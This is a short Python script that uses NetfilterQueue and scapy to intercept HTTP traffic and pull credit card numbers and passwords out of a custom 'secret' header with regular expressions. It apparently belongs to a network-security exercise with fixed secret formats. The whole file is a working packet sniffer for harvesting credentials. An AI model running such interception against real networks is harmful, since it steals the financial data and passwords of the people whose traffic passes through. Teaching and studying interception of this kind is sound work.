#!/usr/bin/env python3
from netfilterqueue import NetfilterQueue
from scapy.layers import http
from scapy.layers.inet import IP
import sys
import re
from typing import Set

nf_queue_id = 0
max_packets = 100

secrets: Set[str] = set()
credit_card_pattern = re.compile(r"cc\s+---\s+((?:[0-9]{4}\.){3}[0-9]{4})")
pass_pattern = re.compile(r"pwd\s+---\s+([0-9A-Z:;<=>?@]+)")


def filter_packets(pkt) -> None:
    sys.stdout.write('.')
    sys.stdout.flush()

    packet = IP(pkt.get_payload())
    if packet.haslayer(http.HTTPRequest):
        data = packet[http.HTTPRequest].fields["Unknown_Headers"][b"secret"].decode()
        sec = credit_card_pattern.findall(data) + pass_pattern.findall(data)
        if len(sec) > 0 and sec[0] not in secrets:
            print("\nNew secret found: {}".format(sec[0]))
            secrets.add(sec[0])
        if len(secrets) >= 3:
            print("Found all secrets: {}".format(secrets))
            sys.exit()

    pkt.accept()  # sends the packcets at the end


nfqueue = NetfilterQueue()
nfqueue.bind(nf_queue_id, filter_packets, max_packets)

try:
    nfqueue.run()
except (KeyboardInterrupt, SystemExit):
    print("Listener killed, exiting")

nfqueue.unbind()
